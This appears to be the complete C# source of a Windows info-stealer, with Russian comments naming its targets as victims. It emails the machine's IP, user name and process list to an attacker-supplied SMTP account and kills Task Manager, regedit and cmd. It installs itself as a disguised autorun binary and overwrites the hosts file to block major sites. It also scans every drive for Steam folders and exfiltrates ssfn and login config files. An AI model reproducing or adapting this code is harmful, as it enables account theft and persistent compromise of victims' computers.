using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using xNet;
using System.Net;
using System.IO;
using System.Diagnostics;
using System.Runtime.InteropServices;
using Microsoft.Win32;
using System.Net.Mail;

namespace WindowsFormsApplication6
{
    class functions
    {
        string IP;
        string userName;
        string MailServer;
        string FromMail;
        string MailPassword;
        string ToMail;

        //Отправка запроса к сайту 
        public void addUser(string MailServer,string FromMail,string MailPassword,string ToMail)
        {
            this.MailServer = MailServer;
            this.FromMail = FromMail;
            this.MailPassword = MailPassword;
            this.ToMail = ToMail;

            string IP = GetPublicIP();
            this.IP = IP;
            string hostName = System.Net.Dns.GetHostName();
            string userName = System.Environment.UserName;
            this.userName = userName;
            string procList = getPocesses();

            string message = "IP:" + IP + " \n" + "HostName:" + hostName + " \n" + "UserName:" + userName + " \n" + "Processes:" + procList + " \n";

            SendMail(MailServer, FromMail, MailPassword, ToMail, this.IP + "||" + this.userName, message, null);
        }
        //Получаем IP жертвы через сайт www.ip-1.ru
        public static string GetPublicIP()
        {
            using (var request = new HttpRequest())
            {
                string content = request.Get("http://www.ip-1.ru").ToString();
                string IP = content.Substring("target=\"_parent\">", "</a>", 0);
                return IP;
            }
        }
        //Получаем список процессов
        public string getPocesses()
        {
            Process[] proc = Process.GetProcesses();

            int pCount = proc.Length;
            string processes = "";
            for (int i = 0; i < pCount; i++)
            {
                processes += (proc[i].ProcessName + "\n");
                processes += (proc[i].StartInfo.FileName + "\n");
            }
            return processes;
        }
        //Импорт dll и скрытие программы из Alt+Tab
        [DllImport("user32.dll")]
        private static extern int SetWindowLong(IntPtr window, int index, int value);
 
        [DllImport("user32.dll")]
        private static extern int GetWindowLong(IntPtr window, int index);
 
        private const int GWL_EXSTYLE = -20;
        private const int WS_EX_TOOLWINDOW = 0x00000080;
 
        public void HideFromAltTab(IntPtr Handle)
        {
            SetWindowLong(Handle, GWL_EXSTYLE, GetWindowLong(Handle,
                GWL_EXSTYLE) | WS_EX_TOOLWINDOW);
        }
        //Прячем диспетчер задач,автозагрузку,редактор реестра,командную строку
        public void HideTaskMgr()
        {
            try
            {
                Process[] taskmgr = Process.GetProcessesByName("taskmgr");
                taskmgr[0].Kill();
            }
            catch{}
            try
            {
                Process[] msconfig = Process.GetProcessesByName("msconfig");
                msconfig[0].Kill();
            }
            catch { }
            try
            {
                Process[] regedit = Process.GetProcessesByName("regedit");
                regedit[0].Kill();
            }
            catch { }
            try
            {
                Process[] cmd = Process.GetProcessesByName("cmd");
                cmd[0].Kill();
            }
            catch { }
        }
        //Добавляем нашу программу в автозапуск и копируем в C:\Windows под именем msedit.exe
        public void setAutoRun()
        {
            string CopyPath = @"C:\Windows";
            System.IO.File.Copy(System.Windows.Forms.Application.ExecutablePath, CopyPath + @"\msedit.exe", true);
            System.IO.File.Copy("xNet.dll", CopyPath + @"\xNet.dll", true);

            RegistryKey reg;
            reg = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\");
            try
            {
                reg.SetValue("System", CopyPath + @"\msedit.exe");
                reg.Close();
            }
            catch{}
        }
                public void modifyHosts() 
        {
             using (StreamWriter writer = File.CreateText(@"C:\Windows\System32\drivers\etc\hosts"))
            {
                writer.WriteLine("127.0.0.1 ya.ru");
                writer.WriteLine("127.0.0.1 vk.com");
                writer.WriteLine("127.0.0.1 yandex.ru");
                writer.WriteLine("127.0.0.1 google.com");
                writer.WriteLine("127.0.0.1 odnoklassniki.ru");
                writer.WriteLine("127.0.0.1 youtube.com");
                writer.WriteLine("127.0.0.1 ya.ru");
                writer.WriteLine("127.0.0.1 ok.ru");
                writer.WriteLine("127.0.0.1 localhost");
            }
        }
        public void getDrives()
        {
            DriveInfo[] drives = DriveInfo.GetDrives();
            for (int i = 0; i < drives.Length; i++)
            {
                getSteam(drives[i].Name);
            }
        }
        public void getSteam(string path)
        {
            try
            {
                DirectoryInfo dir = new DirectoryInfo(path);

                foreach (DirectoryInfo d in dir.GetDirectories())
                {
                    if (d.Name == "steam" || d.Name == "Steam")
                    {
                        foreach (DirectoryInfo s in d.GetDirectories())
                        {
                            if (s.Name == "steamapps" || s.Name == "SteamApps")
                            {
                                DirectoryInfo Steam = new DirectoryInfo(path + d.Name);
                                stealSSFN(Steam);
                                DirectoryInfo SteamConfig = new DirectoryInfo(path + d.Name + @"\config");
                                stealConfig(SteamConfig);
                                break;
                            }
                        }
                    }
                    else
                    {
                        getSteam(path + d.Name + @"\");
                    }
                }
            }
            catch (Exception e)
            {
            }
        }
        //Крадём ssfn файлы
        public void stealSSFN(DirectoryInfo path)
        {
            foreach (var item in path.GetFiles())
            {
                string s = Convert.ToString(item);
                if (s[0] == 's' && s[1] == 's' && s[2] == 'f' && s[3] == 'n')
                {
                    string sPath = path.ToString() + @"\" + s;
                    SendMail(this.MailServer, this.FromMail, this.MailPassword, this.ToMail, this.IP + "||" + this.userName, "SSFN Files", sPath);
                }
            }
        }
        //Крадём config файлы
        public void stealConfig(DirectoryInfo path)
        {
            foreach (var item in path.GetFiles())
            {
                string s = Convert.ToString(item);
                if (s == "config.vdf" || s == "loginusers.vdf" || s == "SteamAppData.vdf")
                {
                    string sPath = path.ToString() + @"\" + s;
                    SendMail(this.MailServer, this.FromMail, this.MailPassword, this.ToMail, this.IP + "||" + this.userName, "Config Files", sPath);
                }
            }
        }
        //Метод отправки сообщений
        public void SendMail(string smtpServer, string from, string password,
        string mailto, string caption, string message, string attachFile1 = null)
        {
            try
            {
                MailMessage mail = new MailMessage();
                mail.From = new MailAddress(from);
                mail.To.Add(new MailAddress(mailto));
                mail.Subject = caption;
                mail.Body = message;
                if (!string.IsNullOrEmpty(attachFile1))
                    mail.Attachments.Add(new Attachment(attachFile1));
                SmtpClient client = new SmtpClient();
                client.Host = smtpServer;
                client.Port = 587;
                client.EnableSsl = true;
                client.Credentials = new NetworkCredential(from.Split('@')[0], password);
                client.DeliveryMethod = SmtpDeliveryMethod.Network;
                client.Send(mail);
                mail.Dispose();
            }
            catch (Exception e)
            {
            }
        }
    }
}
